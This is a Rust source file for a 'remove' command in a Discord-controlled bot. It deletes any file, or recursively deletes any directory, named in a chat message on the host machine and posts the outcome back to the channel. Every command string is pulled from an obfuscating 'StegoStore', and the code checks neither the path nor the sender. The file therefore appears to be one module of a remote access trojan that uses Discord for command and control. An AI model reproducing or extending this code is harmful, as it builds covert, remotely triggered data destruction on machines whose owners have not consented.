use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct RemoveCommand;

impl RemoveCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for RemoveCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("RM_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "RM").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("RM_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".remove old_file.txt", ".remove /tmp/folder"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("RM_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("RM_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let path_str_owned = args.rest();
        let path_str = path_str_owned.trim();

        if path_str.is_empty() {
            http.create_message(msg.channel_id.get(), &format!("{}: {}. {}: {}", Self::f("PATH_NOT_FOUND"), Self::f("ERR_PROVIDE_PATH"), StegoStore::get(StringCategory::Core, "USAGE"), Self::c("RM_USAGE"))).await?;
            return Ok(());
        }

        let path = Path::new(path_str);

        if !path.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("PATH_NOT_FOUND"), path_str)).await?;
            return Ok(());
        }

        if path.is_file() {
            match fs::remove_file(path) {
                Ok(_) => {
                    http.create_message(msg.channel_id.get(), &format!(
                            "{} `{}`",
                            Self::f("RM_SUCCESS_FILE"),
                            path_str
                        )).await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id.get(), &format!(
                            "{} `{}`: {}",
                            Self::f("RM_ERR_FILE"),
                            path_str, e
                        )).await?;
                }
            }
        } else if path.is_dir() {
            match fs::remove_dir_all(path) {
                Ok(_) => {
                    http.create_message(msg.channel_id.get(), &format!(
                            "{} `{}`",
                            Self::f("RM_SUCCESS_DIR"),
                            path_str
                        )).await?;
                }
                Err(e) => {
                    http.create_message(msg.channel_id.get(), &format!(
                            "{} `{}`: {}",
                            Self::f("RM_ERR_DIR"),
                            path_str, e
                        )).await?;
                }
            }
        } else {
            http.create_message(msg.channel_id.get(), &format!(
                    "{}: `{}`",
                    Self::f("RM_ERR_NEITHER"),
                    path_str
                )).await?;
        }

        Ok(())
    }
}


